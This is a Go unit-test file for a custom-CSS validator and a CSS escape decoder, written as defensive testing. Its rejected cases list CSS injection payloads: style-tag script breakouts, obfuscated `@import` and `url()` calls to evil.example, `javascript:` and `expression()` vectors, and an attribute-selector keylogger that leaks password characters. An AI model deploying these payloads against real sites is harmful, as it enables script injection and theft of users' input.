package utils

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestValidateCustomCSS_Allowed(t *testing.T) {
	tests := map[string]string{
		"empty":               "",
		"plain rules":         ".glass-card { border-radius: 0; color: #fff }",
		"escaped class":       `.sm\:p-6 { padding: 0 }`,
		"content escape":      `a::before { content: "\201C" }`,
		"media range":         "@media (width < 40rem) { body { font-size: 14px } }",
		"data image":          `body { background: url(data:image/png;base64,iVBORw0KGgo=) }`,
		"quoted data image":   `body { background: URL( "data:image/svg+xml,%3Csvg/%3E" ) }`,
		"font-face local":     `@font-face { font-family: x; src: local("Arial") }`,
		"scroll-behavior":     "html { scroll-behavior: smooth }",
		"html comment tokens": "<!-- .a { color: red } -->",
		"attribute selector":  `input[value^="a"] { color: red }`,
		"exactly the cap":     strings.Repeat("a", MaxCustomCSSBytes),
	}
	for name, css := range tests {
		t.Run(name, func(t *testing.T) {
			assert.NoError(t, ValidateCustomCSS(css))
		})
	}
}

func TestValidateCustomCSS_Rejected(t *testing.T) {
	tests := map[string]string{
		"over the cap":                 strings.Repeat("a", MaxCustomCSSBytes+1),
		"nul byte":                     "a { color: red }\x00",
		"invalid utf-8":                "a { color: \xff }",
		"style breakout":               `</style><script>alert(1)</script>`,
		"style breakout, case":         `</STYLE >`,
		"style breakout, escaped":      `<\/style>`,
		"import url":                   `@import url("https://evil.example/x.css");`,
		"import string":                `@import "https://evil.example/x.css";`,
		"import, case":                 `@IMPORT 'x.css';`,
		"import, escaped":              `@\69mport "https://evil.example/x.css";`,
		"import, escaped + space":      `@\000069 mport "x.css";`,
		"external url":                 `body { background: url(https://evil.example/a.png) }`,
		"external url, quoted":         `body { background: url( "https://evil.example/a.png" ) }`,
		"protocol-relative url":        `body { background: url(//evil.example/a.png) }`,
		"relative url":                 `body { background: url(/api/v1/users/me) }`,
		"url, case":                    `body { background: URL(https://evil.example) }`,
		"url, escaped":                 `body { background: \75rl("https://evil.example") }`,
		"url, escaped crlf":            "body { background: \\75\r\nrl(\"https://evil.example\") }",
		"url, escaped newline":         "body { background: ur\\\nl(https://evil.example) }",
		"url behind a comment":         `body { background: url(/**/https://evil.example) }`,
		"url split by a comment":       `body { background: u/**/rl(https://evil.example) }`,
		"url, leading space":           `body { background: url(" https://evil.example") }`,
		"data url that is no image":    `body { background: url(data:text/html,<script>alert(1)</script>) }`,
		"relative url behind a quote":  `a { background: url("'data:image/a'/../../../_next/image?url=https://evil.example/x&w=64&q=75") }`,
		"relative url, escaped quote":  `a { background: url(\"data:image/a\"/../../../_next/image?url=https://evil.example/x&w=64&q=75) }`,
		"relative url, hex quote":      `a { background: url(\22 data:image/a\22/../../../_next/image?url=https://evil.example/x) }`,
		"relative url, quote in quote": `a { background: url('"data:image/a"/../x') }`,
		"second url":                   `a { background: url(data:image/png;base64,AA==) } b { background: url(http://evil.example) }`,
		"font-face src":                `@font-face { font-family: x; src: url(https://evil.example/f.woff2) }`,
		"image-set string":             `body { background: image-set("https://evil.example/a.png" 1x) }`,
		"webkit image-set":             `body { background: -webkit-image-set(url(data:image/png;base64,AA==) 1x) }`,
		"src function":                 `@font-face { src: src("https://evil.example/f.woff2") }`,
		"keylogger":                    `input[type="password"][value$="a"] { background: url("https://evil.example/a") }`,
		"expression":                   `a { width: expression(alert(1)) }`,
		"javascript url":               `a { background: url(javascript:alert(1)) }`,
		"javascript, escaped":          `a { x: java\73 cript:alert(1) }`,
		"moz binding":                  `a { -moz-binding: none }`,
	}
	for name, css := range tests {
		t.Run(name, func(t *testing.T) {
			assert.Error(t, ValidateCustomCSS(css))
		})
	}
}

func TestDecodeCSSEscapes(t *testing.T) {
	tests := map[string]string{
		`plain`:        "plain",
		`\75rl(`:       "url(",
		`\75 rl(`:      "url(",
		`\000075  rl(`: "u rl(",
		`\u\r\l(`:      "url(",
		"a\\\nb":       "ab",
		`\0`:           "\uFFFD",
		`\110000`:      "\uFFFD",
		`end\`:         "end",
		`\"\'\22 \27`:  "\uFFFD\uFFFD\uFFFD\uFFFD",
	}
	for css, want := range tests {
		assert.Equal(t, want, decodeCSSEscapes(css), css)
	}
}
